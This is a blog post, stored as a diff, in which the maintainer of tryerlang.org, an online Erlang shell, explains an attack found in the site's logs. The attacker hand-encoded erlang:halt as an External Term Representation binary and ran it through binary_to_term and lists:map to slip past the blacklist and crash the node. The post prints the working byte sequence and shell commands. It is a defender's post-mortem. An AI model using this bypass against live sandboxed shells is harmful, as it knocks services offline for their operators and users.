@@ -1,0 +1,295 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>How they tried to fool tryerlang.org - Roberto Aloi</title>
+  <meta name="author" content="Roberto Aloi">
+
+  
+  <meta name="description" content="Preface tryerlang.org is an Interactive Erlang Shell which allows you to try the power of Erlang directly in your browser, without installing &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://prof3ta.github.com/blog/2010/10/14/how-they-tried-to-fool-tryerlang-org/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="/javascripts/ender.js"></script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <link href="/atom.xml" rel="alternate" title="Roberto Aloi" type="application/atom+xml">
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Roberto Aloi</a></h1>
+  
+    <h2>Software Engineer, Erlang Passionate, Father.</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:prof3ta.github.com" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+  <li><a href="/languagesintheworld">Languages In The World</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">How They Tried to Fool tryerlang.org</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2010-10-14T00:00:00+02:00" pubdate data-updated="true">Oct 14<span>th</span>, 2010</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><h3>Preface</h3>
+<p style="text-align:justify;"><a title="tryerlang.org" href="http://tryerlang.org" target="_blank">tryerlang.org</a> is an Interactive Erlang Shell which allows you to try the power of Erlang directly in your browser, without installing anything in your machine. In the first months of his existence, tryerlang.org has been subjected to a countless number of attacks, aiming at bringing the Erlang node down. Studying the tryerlang.org&#8217;s logs has been so far an highly interesting and constructive experience.</p>
+<p style="text-align:justify;">In this blog post I will present one of the attempted attacks. The attack was based on the concept of <em>External Term Representation </em>for Erlang, which is introduced in the next section.</p>
+
+<h3>External Term Representation</h3>
+<p style="text-align:justify;">In the distribution mechanism of Erlang, Erlang terms are converted into binaries before being sent to a remote host and then converted back into Erlang terms at the destination. The built-in functions <code>term_to_binary</code> and <code>binary_to_term</code> are used for the conversions.</p>
+<p style="text-align:justify;">More information about the External Term Representation are available in <a title="Erlang External Term Representation" href="http://www.erlang.org/doc/apps/erts/erl_ext_dist.html" target="_blank">the official Erlang Documentation</a>. How the External Term Representation has been used to perform the attack is explained in the next section.</p>
+
+<h3>Halting the Erlang Node</h3>
+<p style="text-align:justify;">The user wants to bring the Erlang node down. He then tries to use the <code>erlang:halt/0</code> function. This function, documented <a title="Erlang Halt" href="http://www.erlang.org/doc/man/erlang.html#halt-0" target="_blank">here</a>, halts the Erlang runtime system and indicates normal exit to the calling environment. It has no return value. The function has been disabled in tryerlang.org for security reasons, so the only result the user get is the following message:</p>
+
+<blockquote>&#8220;This functionality has been disabled for security reasons in tryerlang.org.&#8221;.</blockquote>
+<p style="text-align:justify;">So far, so good. The Erlang node is still up. The user thinks for a while and then he notices that tryerlang.org allows you to define <a title="Erlang Funs" href="http://www.erlang.org/doc/programming_examples/funs.html" target="_blank">funs</a>. Here is where the External Term Representation can help. <a title="export_ext" href="http://www.erlang.org/doc/apps/erts/erl_ext_dist.html#id83276" target="_blank">According to the documentation</a>, it is possible to encode an external fun - something like <code>fun M:F/A</code> - in the  following way:</p>
+<p style="text-align:justify;"><code>113 | Module | Function | Arity</code></p>
+<p style="text-align:justify;">Where <strong>Module</strong> and <strong>Function</strong> are atoms and <strong>Arity </strong>is  an integer. The atoms can be encoded using <a title="atom ext" href="http://www.erlang.org/doc/apps/erts/erl_ext_dist.html#ATOM_EXT" target="_blank">ATOM_EXT</a>, while <a title="small integer ext" href="http://www.erlang.org/doc/apps/erts/erl_ext_dist.html#id80902" target="_blank">SMALL_INTEGER_EXT</a> can be used for the arity integer.</p>
+<p style="text-align:justify;">The encoding for the atoms looks like:</p>
+<p style="text-align:justify;"><code>100 | Len | AtomName</code></p>
+<p style="text-align:justify;">Where <code>Len</code> is the length of <code>AtomName</code>, expressed in two bytes.</p>
+<p style="text-align:justify;">Finally, the encoding for the small integers looks like:</p>
+<p style="text-align:justify;"><code>97 | Int</code></p>
+<p style="text-align:justify;">The last thing we have to consider is that, in the External Term Representation, the byte <code>131</code> needs to be prepended to the term. Now that we have all the required knowledge to do it, let&#8217; try to encode the <code>erlang:halt/</code>0 function using the External Term Representation and let see if we can fool tryerlang.org!</p>
+<p style="text-align:justify;">We could write the binaries for the atoms <strong>erlang</strong> and <strong>halt</strong> by hand, but it&#8217;s actually more handy to use the <code>term_to_binary/1</code> BIF to do it for us. Since the function is blacklisted in tryerlang.org, let&#8217;s use our own shell.</p>
+<p style="text-align:justify;"><code>Eshell V5.8.1  (abort with ^G)</code></p>
+<p style="text-align:justify;"><code>&gt; term_to_binary(erlang).</code></p>
+<p style="text-align:justify;"><code>&lt;&lt;131,100,0,6,101,114,108,97,110,103&gt;&gt;</code></p>
+<code>&gt; term_to_binary(halt).</code>
+<p style="text-align:justify;"><code>&lt;&lt;131,100,0,4,104,97,108,116&gt;&gt;</code></p>
+<p style="text-align:justify;">Skipping the initial <code>131</code> byte (see above) and concatenating the other two obtained terms, we have:</p>
+<p style="text-align:justify;"><code> &lt;&lt;100,0,6,101,114,108,97,110,103,
+100,0,4,104,97,108,116&gt;&gt;
+</code></p>
+<p style="text-align:justify;">Prepending the <code>131</code> (prefix for all terms) and <code>113</code> (prefix for external funs) bytes and appending the arity integer, we have:</p>
+<p style="text-align:justify;"><code> &lt;&lt;131,113,
+100,0,6,101,114,108,97,110,103,
+100,0,4,104,97,108,116,
+97,0&gt;&gt;
+</code></p>
+<p style="text-align:justify;">We should have the binary representation of the external fun <code>erlang:halt/0</code>. Let&#8217;s check it!</p>
+<p style="text-align:justify;"><code>&gt; binary_to_term(&lt;&lt;131,113,
+100,0,6,101,114,108,97,110,103,
+100,0,4,104,97,108,116,97,0&gt;&gt;).</code></p>
+<p style="text-align:justify;"><code>8&gt;#Fun&lt;erlang.halt.0&gt;</code></p>
+<p style="text-align:justify;">Let&#8217;s now take this binary from our shell and let&#8217;s paste it in tryerlang.org. Oh, I forgot that the online shell doesn&#8217;t allow copy and paste (what a shame!), so we have to fill the whole binary sequence by hand&#8230;</p>
+<p style="text-align:justify;">After a couple of minutes of struggling against typos and errors, here&#8217;s our wonderful fun which we can bind to a new variable:</p>
+<p style="text-align:justify;"><code>&gt;B = &lt;&lt;131,113,100,0,6,101,114,108,
+97,110,103,100,0,4,104,97,108,116,97,0&gt;&gt;.</code></p>
+<p style="text-align:justify;">We now need to convert the binary into an Erlang term. Originally, tryerlang.org was allowing <a title="Erlang Safe Binary To Term" href="http://www.erlang.org/doc/man/erlang.html#binary_to_term-2" target="_blank">the binary_to_term function in safe mode</a>. This function has been now completely disabled after this attack. If you want to try what follows you will need to do it in your own Erlang shell.</p>
+<p style="text-align:justify;"><code>&gt;F = binary_to_term(B, [safe]).</code></p>
+<p style="text-align:justify;">Let&#8217;s now try to launch the fun as:</p>
+<p style="text-align:justify;"><code>&gt;F().</code></p>
+<p style="text-align:justify;">Well, that didn&#8217;t work as expected. tryerlang.org actually realized that the <code>erlang:halt/0</code> function was going to be called and he managed to block it. We need something different.</p>
+<p style="text-align:justify;">What would happens if we embed the <code>halt</code> function in another function call, say a <code>list:map/2</code>? The only problem would be that we need a parameter in our halt function. Fortunately <a href="http://www.erlang.org/doc/man/erlang.html#halt-1" target="_blank">an alternative version of <code>erlang:halt/0</code> exists, taking exactly one argument</a>. Let&#8217;s create an external representation for it. We just need to change the last element from 0 to 1. The BIF <code>f/1</code> forgets the value of a bounded variable.</p>
+<p style="text-align:justify;"><code>&gt; f(B).</code></p>
+<p style="text-align:justify;"><code>&gt; B = &lt;&lt;131,113,100,0,6,101,114,
+108,97,110,103,100,0,4,104,97,108,116,97,1&gt;&gt;.
+</code></p>
+<p style="text-align:justify;">Now we should be able to do&#8230;
+<code>
+&gt; f(F).</code></p>
+<p style="text-align:justify;"><code>&gt;F = binary_to_term(B, [safe]).</code></p>
+<p style="text-align:justify;"><code>&gt;lists:map(F, [0]).
+</code></p>
+<p style="text-align:justify;">And the node dies.</p>
+<p style="text-align:justify;">Actually the node is almost immediately brought back by <a title="Erlang Heart" href="http://www.erlang.org/doc/man/heart.html" target="_blank">heart</a> but, hey, I have to pay a beer to this guy! :)</p>
+<p style="text-align:justify;">Please note that <strong>the hacker had the advantage to look at the source code for tryerlang.org while performing the attack.</strong></p>
+<p style="text-align:justify;">I wanted to share this experience with all of you. I consider it highly constructive, since it leads to reflect on several aspects of Erlang. Comments and feedback are more than welcome.</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Roberto Aloi</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2010-10-14T00:00:00+02:00" pubdate data-updated="true">Oct 14<span>th</span>, 2010</time>
+      
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://prof3ta.github.com/blog/2010/10/14/how-they-tried-to-fool-tryerlang-org/" data-via="robertoaloi" data-counturl="http://prof3ta.github.com/blog/2010/10/14/how-they-tried-to-fool-tryerlang-org/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2010/10/09/pair-programming/" title="Previous Post: Pair Programming">&laquo; Pair Programming</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2010/11/24/how-to-manage-multiple-erlang-installations/" title="Next Post: How to manage multiple Erlang installations">How to manage multiple Erlang installations &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2011/04/18/domain-renewal-group-fraud/">Domain Renewal Group Fraud</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2010/12/11/the-growth-of-erlang-the-stack-overflow-case-study/">The growth of Erlang: The Stack Overflow Case Study</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2010/11/24/how-to-manage-multiple-erlang-installations/">How to manage multiple Erlang installations</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2010/10/14/how-they-tried-to-fool-tryerlang-org/">How they tried to fool tryerlang.org</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2010/10/09/pair-programming/">Pair Programming</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+<section>
+  <h1>Latest Tweets</h1>
+  <ul id="tweets">
+    <li class="loading">Status updating...</li>
+  </ul>
+  <script type="text/javascript">
+    $.domReady(function(){
+      getTwitterFeed("robertoaloi", 4, false);
+    });
+  </script>
+  <script src="/javascripts/twitter.js" type="text/javascript"> </script>
+  
+    <a href="http://twitter.com/robertoaloi" class="twitter-follow-button" data-show-count="false">Follow @robertoaloi</a>
+  
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2012 - Roberto Aloi -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
